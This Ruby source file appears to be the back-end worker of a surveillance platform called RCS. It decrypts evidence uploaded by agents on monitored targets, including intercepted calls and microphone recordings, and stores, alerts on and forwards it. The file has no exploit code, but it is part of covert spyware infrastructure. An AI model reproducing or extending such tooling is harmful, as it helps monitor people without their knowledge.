# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'

if File.directory?(Dir.pwd + '/lib/rcs-worker-release')
  require 'rcs-db-release/config'
  require 'rcs-db-release/db_layer'
  require 'rcs-db-release/grid'
  require 'rcs-db-release/alert'
  require 'rcs-db-release/forward'
else
  require 'rcs-db/config'
  require 'rcs-db/db_layer'
  require 'rcs-db/grid'
  require 'rcs-db/alert'
  require 'rcs-db/forward'
end

require_relative 'call_processor'
require_relative 'mic_processor'
require_relative 'single_processor'

require 'mongo'
require 'openssl'
require 'digest/sha1'
require 'thread'

# specific evidence processors
Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
  require file
end

module RCS
module Worker

class InstanceWorker
  include RCS::Tracer
  
  SLEEP_TIME = 10

  def get_agent_target
    @agent = Item.agents.where({ident: @ident, instance: @instance}).first
    raise "Agent \'#{@ident}:#{@instance}\' cannot be found." if @agent.nil?
    @target = @agent.get_parent
  end
  
  def initialize(instance, ident)
    @instance = instance
    @ident = ident
    @evidences = []
    @state = :running
    @seconds_sleeping = 0
    @semaphore = Mutex.new
    
    # get info about the agent instance from evidence db
    get_agent_target

    trace :info, "Created processor for agent #{@agent['ident']}:#{@agent['instance']} (target #{@target['_id']})"
    
    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    @key = Digest::MD5.digest @agent['logkey']

    @process = Proc.new do
      resume

      until sleeping_too_much?
        until @evidences.empty?
          resume
          raw_id = BSON::ObjectId(@evidences.shift)

          trace :debug, "[#{@agent['ident']}:#{@agent['instance']}] still #{@evidences.size} evidences to go ..."

          begin
            start_time = Time.now

            # get binary evidence
            data = RCS::DB::GridFS.get(raw_id, "evidence")
            raise "Empty evidence" if data.nil?

            raw = data.read

            # deserialize binary evidence and forward decoded
            evidences, action = begin
              RCS::Evidence.new(@key).deserialize(raw) do |data|
              end
            rescue EmptyEvidenceError => e
              trace :info, "[#{raw_id}:#{@ident}:#{@instance}] deleting empty evidence #{raw_id}"
              RCS::DB::GridFS.delete(raw_id, "evidence")
              next
            rescue EvidenceDeserializeError => e
              trace :warn, "[#{raw_id}:#{@ident}:#{@instance}] decoding failed for #{raw_id}: #{e.to_s}, deleting..."
              RCS::DB::GridFS.delete(raw_id, "evidence")
              next
            end

            # if evidences is nil, emulate there's no evidence, delete raw
            if evidences.nil?
              evidences = Array.new
              action = :delete_raw
            end

            ev_type = ''

            evidences.each do |ev|

              next if ev.empty?
              
              # find correct processing module and extend evidence
              mod = "#{ev[:type].to_s.capitalize}Processing"
              if RCS.const_defined? mod.to_sym
                ev.extend eval(mod)
              else
                ev.extend DefaultProcessing
              end

              ev.process if ev.respond_to? :process

              trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] processing evidence of type #{ev[:type]} (#{raw.bytesize} bytes)"

              # override original type
              ev[:type] = ev.type if ev.respond_to? :type
              ev_type = ev[:type]

              processor = case ev[:type]
                            when :call
                              @call_processor ||= CallProcessor.new(@agent, @target)
                              @call_processor
                            when :mic
                              @mic_processor ||= MicProcessor.new(@agent, @target)
                              @mic_processor
                            else
                              @single_processor ||= SingleProcessor.new(@agent, @target)
                              @single_processor
                          end

              begin
                evidence_id, index = processor.feed(ev) do |evidence|
                  # check if there are matching alerts for this evidence
                  RCS::DB::Alerting.new_evidence evidence unless evidence.nil?

                  # forward the evidence to connectors (if any)
                  RCS::DB::Forwarding.new_evidence(evidence) unless evidence.nil?
                end
                
                # forward raw evidence
                RCS::DB::Forwarding.new_raw(raw_id, index, @agent, evidence_id)
                
                # delete raw evidence
                RCS::DB::GridFS.delete(raw_id, "evidence")
                trace :debug, "deleted raw evidence #{raw_id}"
                
              rescue Exception => e
                trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
                trace :error, "[#{raw_id}:#{@ident}:#{@instance}] #{e.backtrace}"
              end
            end
            
            processing_time = Time.now - start_time
            trace :info, "[#{raw_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"

          rescue Mongo::ConnectionFailure => e
            trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot connect to database, retrying in 5 seconds ..."
            sleep 5
            retry
          rescue Exception => e
            trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] FAILURE: " << e.to_s
            trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] EXCEPTION: " + e.backtrace.join("\n")

            Dir.mkdir "forwarded" unless File.exists? "forwarded"
            path = "forwarded/#{raw_id}.raw"
            f = File.open(path, 'wb') {|f| f.write raw}
            trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
          end
        end
        take_some_rest
      end

      put_to_sleep
    end

    EM.defer @process
  end
  
  def resume
    @state = :running
    @seconds_sleeping = 0
  end
  
  def take_some_rest
    sleep 1
    @seconds_sleeping += 1
  end
  
  def put_to_sleep
    @state = :stopped
    trace :debug, "processor #{@agent['ident']}:#{@agent['instance']} is sleeping too much, let's stop!"
  end
  
  def stopped?
    @state == :stopped
  end

  def forwarding?
    RCS::DB::Config.instance.global['FORWARD'] == true
  end
  
  def sleeping_too_much?
    @seconds_sleeping >= SLEEP_TIME
  end
  
  def queue(id)
    @evidences << id unless id.nil?

    @semaphore.synchronize do
      if stopped?
        trace :debug, "deferring work for #{@agent['ident']}:#{@agent['instance']}"
        EM.defer @process
      end
    end
  end

  def to_s
    "#{@agent['ident']}:#{@agent['instance']}: #{@evidences.size}"
  end
end

end # ::Worker
end # ::RCS
